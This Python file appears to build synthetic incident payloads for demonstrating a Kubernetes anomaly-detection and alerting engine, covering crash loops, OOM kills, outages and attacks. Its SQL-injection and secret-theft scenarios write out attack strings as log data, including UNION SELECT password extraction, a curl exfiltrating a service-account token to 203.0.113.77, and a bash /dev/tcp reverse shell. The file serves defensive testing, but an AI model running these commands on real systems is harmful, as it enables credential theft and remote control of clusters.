"""
Demo scenarios — each returns the raw payloads to POST to the AI engine's
internal ingest endpoints (which go straight through the full pipeline:
anomaly detection → incident creation → RCA → all alert channels).
"""

from datetime import datetime, timezone, timedelta
import random
import string


def _now():
    return datetime.now(timezone.utc).isoformat()


def _ts(minutes_ago: int = 0):
    return (datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)).isoformat()


# ─── Scenario: CrashLoopBackOff ───────────────────────────────────────────────

CRASH_LOOP = {
    "description": "Payment service is crash-looping due to DB connection exhaustion",
    "logs": [
        {"timestamp": _ts(5), "namespace": "production", "pod_name": "payment-svc-7d9f4b-xkp2m",
         "container_name": "payment-svc", "node_name": "node-01",
         "message": "INFO Starting payment service v2.3.1"},
        {"timestamp": _ts(4), "namespace": "production", "pod_name": "payment-svc-7d9f4b-xkp2m",
         "container_name": "payment-svc", "node_name": "node-01",
         "message": "ERROR Failed to connect to PostgreSQL: FATAL: remaining connection slots are reserved"},
        {"timestamp": _ts(3), "namespace": "production", "pod_name": "payment-svc-7d9f4b-xkp2m",
         "container_name": "payment-svc", "node_name": "node-01",
         "message": "ERROR Retry 1/5: connection refused 10.96.0.10:5432"},
        {"timestamp": _ts(2), "namespace": "production", "pod_name": "payment-svc-7d9f4b-xkp2m",
         "container_name": "payment-svc", "node_name": "node-01",
         "message": "ERROR Retry 5/5: connection refused 10.96.0.10:5432"},
        {"timestamp": _ts(1), "namespace": "production", "pod_name": "payment-svc-7d9f4b-xkp2m",
         "container_name": "payment-svc", "node_name": "node-01",
         "message": "FATAL Could not establish database connection pool. Exiting with status 1"},
        {"timestamp": _now(), "namespace": "production", "pod_name": "payment-svc-7d9f4b-xkp2m",
         "container_name": "payment-svc", "node_name": "node-01",
         "message": "panic: runtime error: invalid memory address or nil pointer dereference"},
    ],
    "events": [
        {"timestamp": _now(), "namespace": "production", "name": "payment-svc-crash-001",
         "reason": "BackOff", "message": "Back-off restarting failed container payment-svc in pod payment-svc-7d9f4b-xkp2m",
         "type": "Warning", "count": 12,
         "involved_object": {"kind": "Pod", "name": "payment-svc-7d9f4b-xkp2m", "namespace": "production"},
         "first_timestamp": _ts(10)},
        {"timestamp": _now(), "namespace": "production", "name": "payment-svc-oom-001",
         "reason": "OOMKilling", "message": "Memory limit reached in container payment-svc (limit: 512Mi)",
         "type": "Warning", "count": 3,
         "involved_object": {"kind": "Pod", "name": "payment-svc-7d9f4b-xkp2m", "namespace": "production"},
         "first_timestamp": _ts(8)},
    ],
    "app_health": [{
        "timestamp": _now(), "namespace": "production", "app_label": "payment-svc",
        "node_name": "node-01", "window_seconds": 60,
        "total_log_lines": 450, "error_lines": 180, "warn_lines": 60,
        "error_rate": 0.40, "http_5xx_count": 320, "http_4xx_count": 45,
        "http_5xx_rate": 0.88, "exception_count": 24,
        "exception_types": {"ConnectionRefusedError": 18, "NullPointerException": 6},
        "avg_latency_ms": 8500.0, "latency_samples": 89,
    }],
}


# ─── Scenario: OOM Kill ────────────────────────────────────────────────────────

OOM = {
    "description": "ML inference service killed by OOM — memory leak in model loading",
    "logs": [
        {"timestamp": _ts(3), "namespace": "ml-platform", "pod_name": "inference-svc-abc123",
         "container_name": "inference", "node_name": "node-gpu-01",
         "message": "INFO Loading model weights from s3://models/bert-large-v3.bin"},
        {"timestamp": _ts(2), "namespace": "ml-platform", "pod_name": "inference-svc-abc123",
         "container_name": "inference", "node_name": "node-gpu-01",
         "message": "WARNING Memory usage at 87% (7.2GB / 8GB limit)"},
        {"timestamp": _ts(1), "namespace": "ml-platform", "pod_name": "inference-svc-abc123",
         "container_name": "inference", "node_name": "node-gpu-01",
         "message": "WARNING Memory usage at 96% (7.9GB / 8GB limit)"},
        {"timestamp": _now(), "namespace": "ml-platform", "pod_name": "inference-svc-abc123",
         "container_name": "inference", "node_name": "node-gpu-01",
         "message": "FATAL OOMKill signal received — process killed by kernel out of memory handler"},
    ],
    "events": [
        {"timestamp": _now(), "namespace": "ml-platform", "name": "inference-oom-001",
         "reason": "OOMKilling", "message": "Memory cgroup out of memory: Kill process 4521 (python3) score 987 or sacrifice child; Killed process 4521 (python3) total-vm:9437184kB, anon-rss:8388608kB",
         "type": "Warning", "count": 1,
         "involved_object": {"kind": "Pod", "name": "inference-svc-abc123", "namespace": "ml-platform"},
         "first_timestamp": _now()},
    ],
    "app_health": [{
        "timestamp": _now(), "namespace": "ml-platform", "app_label": "inference-svc",
        "node_name": "node-gpu-01", "window_seconds": 60,
        "total_log_lines": 120, "error_lines": 45, "warn_lines": 30,
        "error_rate": 0.375, "http_5xx_count": 89, "http_4xx_count": 5,
        "http_5xx_rate": 0.95, "exception_count": 8,
        "exception_types": {"MemoryError": 5, "OOMKilledException": 3},
        "avg_latency_ms": 12000.0, "latency_samples": 12,
    }],
}


# ─── Scenario: SQL Injection Attack ──────────────────────────────────────────

SQL_INJECTION = {
    "description": "SQL injection attempts against the user API endpoint",
    "security_threats": [
        {"timestamp": _ts(3), "category": "web_attack", "severity": "high",
         "source": "log_scan", "node_name": "node-01",
         "namespace": "production", "pod_name": "api-gateway-6f7b8c", "container": "api-gateway",
         "description": "SQL injection attempt: GET /api/users?id=1' OR '1'='1 from 185.220.101.45",
         "source_ips": ["185.220.101.45"],
         "raw_log_line": "GET /api/users?id=1' OR '1'='1 HTTP/1.1 500 185.220.101.45"},
        {"timestamp": _ts(2), "category": "web_attack", "severity": "high",
         "source": "log_scan", "node_name": "node-01",
         "namespace": "production", "pod_name": "api-gateway-6f7b8c", "container": "api-gateway",
         "description": "SQL injection attempt: POST /api/login with payload: admin'--",
         "source_ips": ["185.220.101.45"],
         "raw_log_line": "POST /api/login HTTP/1.1 username=admin'-- 500 185.220.101.45"},
        {"timestamp": _ts(1), "category": "web_attack", "severity": "high",
         "source": "log_scan", "node_name": "node-01",
         "namespace": "production", "pod_name": "api-gateway-6f7b8c", "container": "api-gateway",
         "description": "SQL injection: UNION SELECT attack pattern detected",
         "source_ips": ["185.220.101.45"],
         "raw_log_line": "GET /api/products?search=x' UNION SELECT username,password FROM users-- HTTP/1.1 500"},
        {"timestamp": _now(), "category": "web_attack", "severity": "high",
         "source": "log_scan", "node_name": "node-01",
         "namespace": "production", "pod_name": "api-gateway-6f7b8c", "container": "api-gateway",
         "description": "SQL injection: database error exposed in response — data leak possible",
         "source_ips": ["185.220.101.45"],
         "raw_log_line": "ERROR: unterminated quoted string at or near FROM pg_catalog"},
    ],
}


# ─── Scenario: Brute Force (correlated, triggers voice call) ─────────────────

def build_brute_force_threats(count: int = 25):
    """Generate enough events from same IP to trigger correlation escalation."""
    threats = []
    for i in range(count):
        threats.append({
            "timestamp": (datetime.now(timezone.utc) - timedelta(seconds=count - i)).isoformat(),
            "category": "brute_force",
            "severity": "medium",
            "source": "log_scan",
            "node_name": "node-01",
            "namespace": "production",
            "pod_name": "auth-service-xyz",
            "container": "auth-service",
            "description": f"Failed authentication attempt {i+1}/25 for user admin from 91.108.4.{random.randint(1,50)}",
            "source_ips": ["91.108.4.12"],
            "raw_log_line": f"Failed password for admin from 91.108.4.12 port {40000+i} ssh2",
        })
    # Final escalation event
    threats.append({
        "timestamp": _now(),
        "category": "brute_force",
        "severity": "high",
        "source": "audit_log",
        "node_name": "node-01",
        "namespace": "kube-system",
        "description": "Brute force escalated: 25 failed auth attempts in 5 minutes from 91.108.4.12 — account lockout triggered",
        "source_ips": ["91.108.4.12"],
    })
    return threats

BRUTE_FORCE = {
    "description": "Sustained brute-force attack — triggers correlation alert + voice call",
    "security_threats": build_brute_force_threats(25),
}


# ─── Scenario: Node Memory Pressure ──────────────────────────────────────────

NODE_PRESSURE = {
    "description": "Two nodes under MemoryPressure — pod evictions starting",
    "cluster_health": {
        "timestamp": _now(),
        "node_name": "node-01",
        "total_nodes": 5,
        "not_ready_nodes": 0,
        "nodes": [
            {"name": "node-01", "ready": True,
             "conditions": {"Ready": True, "MemoryPressure": True, "DiskPressure": False, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
            {"name": "node-02", "ready": True,
             "conditions": {"Ready": True, "MemoryPressure": True, "DiskPressure": False, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
            {"name": "node-03", "ready": True,
             "conditions": {"Ready": True, "MemoryPressure": False, "DiskPressure": False, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
            {"name": "node-04", "ready": True,
             "conditions": {"Ready": True, "MemoryPressure": False, "DiskPressure": True, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
            {"name": "node-05", "ready": True,
             "conditions": {"Ready": True, "MemoryPressure": False, "DiskPressure": False, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
        ],
        "total_pods": 85,
        "running_pods": 72,
        "pending_pods": 10,
        "failed_pods": 3,
        "crash_loop_pods": 2,
        "crash_loop_details": [
            {"namespace": "production", "name": "cache-service-abc", "container": "cache", "restarts": 8},
            {"namespace": "staging", "name": "worker-xyz", "container": "worker", "restarts": 5},
        ],
        "total_restarts": 34,
        "total_pvcs": 12,
        "bound_pvcs": 10,
        "unbound_pvcs": 2,
        "unbound_pvc_names": ["production/data-pvc-01", "staging/logs-pvc-02"],
        "total_deployments": 18,
        "degraded_deployments": 3,
        "degraded_deployment_names": [
            "production/payment-svc (ready 0/3)",
            "production/notification-svc (ready 1/2)",
            "staging/analytics (ready 0/1)",
        ],
        "quota_saturations": [
            {"namespace": "production", "resource": "requests.memory",
             "saturation": 0.92, "used": "11.5Gi", "hard": "12.5Gi"},
        ],
    },
}


# ─── Scenario: Latency Spike ──────────────────────────────────────────────────

LATENCY_SPIKE = {
    "description": "API gateway latency spike — 8x above baseline",
    "app_health": [
        # Feed 12 normal windows to build a baseline first
        *[{
            "timestamp": (datetime.now(timezone.utc) - timedelta(minutes=12 - i)).isoformat(),
            "namespace": "production", "app_label": "api-gateway",
            "node_name": "node-01", "window_seconds": 60,
            "total_log_lines": 2000, "error_lines": 20, "warn_lines": 30,
            "error_rate": 0.01, "http_5xx_count": 5, "http_4xx_count": 40,
            "http_5xx_rate": 0.002, "exception_count": 2,
            "exception_types": {}, "avg_latency_ms": 120.0 + random.uniform(-20, 20),
            "latency_samples": 1800,
        } for i in range(12)],
        # Then the anomalous window
        {
            "timestamp": _now(), "namespace": "production", "app_label": "api-gateway",
            "node_name": "node-01", "window_seconds": 60,
            "total_log_lines": 1800, "error_lines": 360, "warn_lines": 120,
            "error_rate": 0.20, "http_5xx_count": 280, "http_4xx_count": 50,
            "http_5xx_rate": 0.15, "exception_count": 45,
            "exception_types": {"TimeoutError": 30, "ConnectionPoolExhausted": 15},
            "avg_latency_ms": 9800.0,  # 8x the 120ms baseline
            "latency_samples": 1750,
        },
    ],
}


# ─── Scenario: Secret Exfiltration ────────────────────────────────────────────

SECRET_THEFT = {
    "description": "Kubectl used inside a compromised pod to exfiltrate secrets",
    "security_threats": [
        {"timestamp": _ts(2), "category": "secret_exfiltration", "severity": "critical",
         "source": "log_scan", "node_name": "node-03",
         "namespace": "production", "pod_name": "web-frontend-hack-pod", "container": "web",
         "description": "Suspicious kubectl call from inside pod: kubectl get secrets -o yaml",
         "source_ips": [],
         "raw_log_line": "kubectl get secrets --all-namespaces -o yaml > /tmp/secrets.yaml"},
        {"timestamp": _ts(1), "category": "secret_exfiltration", "severity": "critical",
         "source": "log_scan", "node_name": "node-03",
         "namespace": "production", "pod_name": "web-frontend-hack-pod", "container": "web",
         "description": "Encoded secret exfiltration over HTTP: base64-encoded KUBECONFIG sent to external server",
         "source_ips": ["203.0.113.77"],
         "raw_log_line": "curl -X POST https://203.0.113.77/collect -d $(base64 /var/run/secrets/kubernetes.io/serviceaccount/token)"},
        {"timestamp": _now(), "category": "reverse_shell", "severity": "critical",
         "source": "log_scan", "node_name": "node-03",
         "namespace": "production", "pod_name": "web-frontend-hack-pod", "container": "web",
         "description": "Reverse shell attempt: bash -i >& /dev/tcp/203.0.113.77/4444 0>&1",
         "source_ips": ["203.0.113.77"],
         "raw_log_line": "bash -i >& /dev/tcp/203.0.113.77/4444 0>&1"},
    ],
}


# ─── Scenario: Cluster Down ────────────────────────────────────────────────────

CLUSTER_DOWN = {
    "description": "3 of 5 nodes NotReady — major cluster outage",
    "cluster_health": {
        "timestamp": _now(),
        "node_name": "node-01",
        "total_nodes": 5,
        "not_ready_nodes": 3,
        "nodes": [
            {"name": "node-01", "ready": True,
             "conditions": {"Ready": True, "MemoryPressure": False, "DiskPressure": False, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
            {"name": "node-02", "ready": False,
             "conditions": {"Ready": False, "MemoryPressure": False, "DiskPressure": False, "NetworkUnavailable": True},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
            {"name": "node-03", "ready": False,
             "conditions": {"Ready": False, "MemoryPressure": False, "DiskPressure": True, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
            {"name": "node-04", "ready": False,
             "conditions": {"Ready": False, "MemoryPressure": True, "DiskPressure": False, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
            {"name": "node-05", "ready": True,
             "conditions": {"Ready": True, "MemoryPressure": False, "DiskPressure": False, "PIDPressure": False},
             "allocatable_cpu_millicores": 4000, "allocatable_memory_bytes": 8589934592},
        ],
        "total_pods": 120,
        "running_pods": 28,
        "pending_pods": 65,
        "failed_pods": 27,
        "crash_loop_pods": 12,
        "crash_loop_details": [],
        "total_restarts": 156,
        "total_pvcs": 15,
        "bound_pvcs": 8,
        "unbound_pvcs": 7,
        "unbound_pvc_names": ["production/db-pvc", "production/cache-pvc", "production/logs-pvc"],
        "total_deployments": 20,
        "degraded_deployments": 14,
        "degraded_deployment_names": [
            "production/payment-svc (ready 0/3)",
            "production/order-svc (ready 0/2)",
            "production/inventory-svc (ready 1/3)",
            "production/user-svc (ready 0/2)",
            "... and 10 more",
        ],
        "quota_saturations": [],
    },
}


# ─── Registry ──────────────────────────────────────────────────────────────────

ALL_SCENARIOS = {
    "crash_loop":    CRASH_LOOP,
    "oom":           OOM,
    "sql_injection": SQL_INJECTION,
    "brute_force":   BRUTE_FORCE,
    "node_pressure": NODE_PRESSURE,
    "latency_spike": LATENCY_SPIKE,
    "secret_theft":  SECRET_THEFT,
    "cluster_down":  CLUSTER_DOWN,
}
